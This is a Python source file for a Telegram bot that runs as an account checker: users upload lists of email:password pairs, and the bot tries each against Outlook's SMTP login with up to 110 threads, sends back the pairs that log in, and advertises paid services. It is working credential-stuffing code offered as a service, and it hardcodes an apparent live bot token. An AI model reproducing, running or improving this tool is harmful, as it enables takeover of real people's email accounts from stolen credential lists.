import os
import smtplib
import traceback
import concurrent.futures
import threading
import time
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from threading import Semaphore, Thread, Lock
import sys

# Telegram bot token and admin chat ID
TELEGRAM_BOT_TOKEN = '7448273565:AAGX9gW0cb2dFSUrslueeLh0nWdwc9jPB7E'
ADMIN_USER_ID = 6226675622

# Semaphore to control the number of active checks
sem = Semaphore(2)

# Global counters and progress message
valid_count = 0
invalid_count = 0
checked_count = 0
progress_message = None
start_time = None
lock = Lock()  # For thread safety

# Queue to manage files to be processed
file_queue = []
queue_lock = Lock()
process_event = threading.Event()

# Global state for pausing and resuming
is_paused = False
pause_lock = Lock()

def banner():
    print("""
    Your ASCII Banner Here
    """)

def check(subject, body, to_email, sender_email, sender_password):
    try:
        message = f"Subject: {subject}\n\n{body}"
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message)
        server.quit()
        return None
    except smtplib.SMTPAuthenticationError:
        return "Authentication failed."
    except Exception as e:
        return f"{str(e)}\n{traceback.format_exc()}"

def update_progress(update, context):
    global progress_message, valid_count, invalid_count, checked_count, start_time

    while checked_count < total_emails:
        with lock:
            elapsed_time = time.time() - start_time
            rate = (checked_count / elapsed_time) * 60 if elapsed_time > 0 else 0
            progress_percentage = (checked_count / total_emails) * 100
            progress_bar = get_progress_bar(progress_percentage)
        
        keyboard = [
            [InlineKeyboardButton(f"Valid: {valid_count} ⚡", callback_data='valid')],
            [InlineKeyboardButton(f"Invalid: {invalid_count} 💔", callback_data='invalid')],
            [InlineKeyboardButton(f"Rate: {rate:.2f} accounts/min 🔥", callback_data='rate')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = f"Checked: {checked_count}/{total_emails} 📊\n{progress_bar}\nValid: {valid_count} ⚡\nInvalid: {invalid_count} 💔\nRate: {rate:.2f} accounts/min 🔥"

        if progress_message:
            context.bot.edit_message_text(chat_id=update.message.chat_id, message_id=progress_message, text=text, reply_markup=reply_markup)
        else:
            msg = update.message.reply_text(text=text, reply_markup=reply_markup)
            progress_message = msg.message_id

        time.sleep(30)  # Update every 30 seconds

def get_progress_bar(percentage):
    full_blocks = int(percentage / 10)
    empty_blocks = 10 - full_blocks
    progress_bar = f"Progress: [{'█' * full_blocks}{'░' * empty_blocks}] {percentage:.0f}%"
    return progress_bar


def check_emailpass(emailpass, live_path, dead_path, update, context):
    global valid_count, invalid_count, checked_count
    
    e = str(emailpass).strip().split(':')
    c = check('Checking...', 'Checking...', e[0], e[0], e[1])
    if c is None:
        with open(live_path, 'a') as file:
            file.write(emailpass + '\n')
        with lock:
            valid_count += 1
    else:
        with open(dead_path, 'a') as file:
            file.write(emailpass + '\n')
        with lock:
            invalid_count += 1
    with lock:
        checked_count += 1

    # Update message every 200 accounts
    if checked_count % 200 == 0:
        with lock:
            elapsed_time = time.time() - start_time
            rate = (checked_count / elapsed_time) * 60 if elapsed_time > 0 else 0
            percent_complete = (checked_count / total_emails) * 100 if total_emails > 0 else 0
            progress_bar = '=' * int(percent_complete // 2) + '-' * (50 - int(percent_complete // 2))
        keyboard = [
            [InlineKeyboardButton(f"Valid: {valid_count}", callback_data='valid')],
            [InlineKeyboardButton(f"Invalid: {invalid_count}", callback_data='invalid')],
            [InlineKeyboardButton(f"Rate: {rate:.2f} accounts/min", callback_data='rate')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = (f"Checked: {checked_count}/{total_emails}\n"
                f"Valid: {valid_count}\n"
                f"Invalid: {invalid_count}\n"
                f"Rate: {rate:.2f} accounts/min\n"
                f"[{progress_bar}] {percent_complete:.2f}%")
        context.bot.edit_message_text(chat_id=update.message.chat_id, message_id=progress_message, text=text, reply_markup=reply_markup)

def process_file(update: Update, context: CallbackContext):
    global valid_count, invalid_count, checked_count, progress_message, start_time, total_emails, is_paused

    with queue_lock:
        file_queue.append((update, context))

    if len(file_queue) > 1:
        context.bot.send_message(chat_id=update.message.chat_id, text="Your file has been added to the queue. Please wait 50 seconds before the check starts.")
    else:
        while file_queue:
            with queue_lock:
                update, context = file_queue.pop(0)

            if is_paused:
                context.bot.send_message(chat_id=update.message.chat_id, text="The bot is currently paused. Please wait.")
                file_queue.insert(0, (update, context))  # Reinsert the file into the queue
                continue

            valid_count = 0
            invalid_count = 0
            checked_count = 0
            progress_message = None

            file = update.message.document.get_file()
            file_path = f"{update.message.chat_id}.txt"
            file.download(file_path)

            with open(file_path, 'r') as f:
                emails = f.readlines()
                total_emails = len(emails)
                
                if total_emails > 20000:
                    context.bot.send_message(chat_id=update.message.chat_id, text="The file is too large. Please provide a file with less than 20,000 accounts.")
                    os.remove(file_path)
                    continue

            live_path = "akatsuki_mail_checker.txt"
            dead_path = f"dead_{update.message.chat_id}.txt"

            # Wait for 50 seconds before starting the check
            context.bot.send_message(chat_id=update.message.chat_id, text="Please wait 15 seconds before the check starts.")
            time.sleep(15)

            start_time = time.time()

            # Start the progress updater thread
            Thread(target=update_progress, args=(update, context)).start()

            with concurrent.futures.ThreadPoolExecutor(max_workers=110) as executor:
                for emailpass in emails:
                    executor.submit(check_emailpass, emailpass, live_path, dead_path, update, context)
            
            # Send final result
            with open(live_path, 'rb') as f:
                update.message.reply_document(InputFile(f, filename=live_path))

            os.remove(file_path)
            os.remove(live_path)
            os.remove(dead_path)

            # Notify admin
            context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"File processing completed for chat_id {update.message.chat_id}")

            # Signal that processing is done
            sem.release()

            if file_queue:
                # If there are more files in the queue, continue processing
                continue

def start(update: Update, context: CallbackContext):
    update.message.reply_text("Send me a .txt file with email:password combinations, and I'll check the accounts for you.")

def pause(update: Update, context: CallbackContext):
    global is_paused
    if update.message.from_user.id == ADMIN_USER_ID:
        with pause_lock:
            is_paused = True
        update.message.reply_text("Bot has been paused.")
    else:
        update.message.reply_text("You do not have permission to use this command.")

def resume(update: Update, context: CallbackContext):
    global is_paused
    if update.message.from_user.id == ADMIN_USER_ID:
        with pause_lock:
            is_paused = False
        update.message.reply_text("Bot has been resumed.")
    else:
        update.message.reply_text("You do not have permission to use this command.")

def restart(update: Update, context: CallbackContext):
    if update.message.from_user.id == ADMIN_USER_ID:
        update.message.reply_text("Restarting the bot...")
        os.execv(sys.executable, ['python'] + sys.argv)
    else:
        update.message.reply_text("You do not have permission to use this command.")

def info(update: Update, context: CallbackContext):
    update.message.reply_text("Bot Information:\n- Version: 1.0\n- Features: Email checking, progress bar, real-time notifications.")

def ping(update: Update, context: CallbackContext):
    update.message.reply_text(f"Bot ping: {round(context.bot.get_updates()[0].date.timestamp() - time.time())} seconds")

def buy(update: Update, context: CallbackContext):
    update.message.reply_text("Price List:\n- Service A: $10\n- Service B: $20")

def handle_document(update: Update, context: CallbackContext):
    if sem.acquire(blocking=False):
        Thread(target=process_file, args=(update, context)).start()
    else:
        context.bot.send_message(chat_id=update.message.chat_id, text="The bot is currently processing other files. Please wait.")

def main():
    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("pause", pause))
    dp.add_handler(CommandHandler("resume", resume))
    dp.add_handler(CommandHandler("restart", restart))
    dp.add_handler(CommandHandler("info", info))
    dp.add_handler(CommandHandler("ping", ping))
    dp.add_handler(CommandHandler("buy", buy))
    dp.add_handler(MessageHandler(Filters.document.file_extension("txt"), handle_document))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
